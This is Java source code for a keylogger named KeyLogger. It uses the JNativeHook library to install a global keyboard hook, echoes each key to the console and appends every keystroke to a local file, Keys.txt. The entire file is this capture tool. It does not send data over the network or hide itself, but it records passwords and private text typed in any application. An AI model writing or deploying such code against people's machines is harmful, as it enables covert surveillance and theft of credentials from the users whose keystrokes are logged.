import org.jnativehook.*;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;

import java.io.IOException;
import java.io.OutputStream;
import java.io.PrintWriter;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.nio.file.StandardOpenOption;

public class KeyLogger implements NativeKeyListener {

    private static final Path file = Paths.get("Keys.txt");

    public static void main(String[] args) {
        try {
            GlobalScreen.registerNativeHook();
        } catch (NativeHookException e) {
            e.printStackTrace();

        }
        GlobalScreen.getInstance().addNativeKeyListener(new KeyLogger());
    }

    @Override
    public void nativeKeyPressed(NativeKeyEvent e) {
        System.out.println("Pressed: " + NativeKeyEvent.getKeyText(e.getKeyCode()));
        String keytext = NativeKeyEvent.getKeyText(e.getKeyCode());

        try (OutputStream os = Files.newOutputStream(file, StandardOpenOption.CREATE, StandardOpenOption.WRITE, StandardOpenOption.APPEND); PrintWriter writer = new PrintWriter(os)) {
            if (keytext.length() > 1) {
                writer.print("[" + keytext + "]");
            } else {
                writer.print(keytext);
            }
        } catch (IOException ex) {
            throw new RuntimeException(ex);
        }

    }


    @Override
    public void nativeKeyReleased(NativeKeyEvent e) {
        System.out.println("Released: " + NativeKeyEvent.getKeyText(e.getKeyCode()));
    }

    @Override
    public void nativeKeyTyped(NativeKeyEvent e) {

    }
}
